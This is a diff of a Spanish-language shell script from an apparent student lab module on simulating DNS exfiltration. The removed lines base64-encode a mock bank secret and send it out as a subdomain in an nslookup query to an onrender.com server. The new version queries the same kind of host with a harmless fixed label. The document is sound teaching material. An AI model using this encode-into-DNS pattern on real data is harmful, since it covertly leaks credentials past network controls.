@@ -1,20 +1,28 @@
+
 #!/bin/sh
 
-# Simulación de un dato confidencial a exfiltrar (ej. un token o credencial)
-DATOS_SENSIBLES="clave_secreta_banco_2026"
+# Dominio de nuestro servidor DMZ
+DOMINIO="servidor-dmz-adelaida-vannesa.onrender.com"
 
-# Codificación del dato en Base64 para simular el formato de subdominio
-DATOS_CODIFICADOS=$(echo -n "$DATOS_SENSIBLES" | base64 | tr -d '=')
+# Etiqueta ficticia: no contiene datos personales ni credenciales
+ETIQUETA="simulacion-dns-laboratorio"
 
-echo "=== SIMULACIÓN: EXFILTRACIÓN DE DATOS VÍA CONSULTAS DNS ==="
-echo "Dato original: $DATOS_SENSIBLES"
-echo "Dato codificado: $DATOS_CODIFICADOS"
-echo "Enviando consulta DNS con el payload incrustado..."
+echo "=========================================="
+echo "MODULO 04 - SIMULACION DE CONSULTA DNS"
+echo "Laboratorio: Adelaida y Vannesa"
+echo "=========================================="
 
-# Se envía la consulta DNS utilizando bind-tools (nslookup)
-nslookup "${DATOS_CODIFICADOS}.servidor-web-dmz-ebl.onrender.com"
+echo "Dominio de prueba: $DOMINIO"
+echo "Etiqueta de demostracion: $ETIQUETA"
+echo ""
 
-echo "=== CONSULTA DNS ENVIADA ==="
+echo "Realizando consulta DNS controlada..."
 
-# Mantener activo el contenedor
-python3 -m http.server 8080
+nslookup "${ETIQUETA}.${DOMINIO}"
+
+echo ""
+echo "=========================================="
+echo "SIMULACION FINALIZADA"
+echo "Se utilizo una etiqueta ficticia."
+echo "No se transmitieron datos confidenciales."
+echo "=========================================="
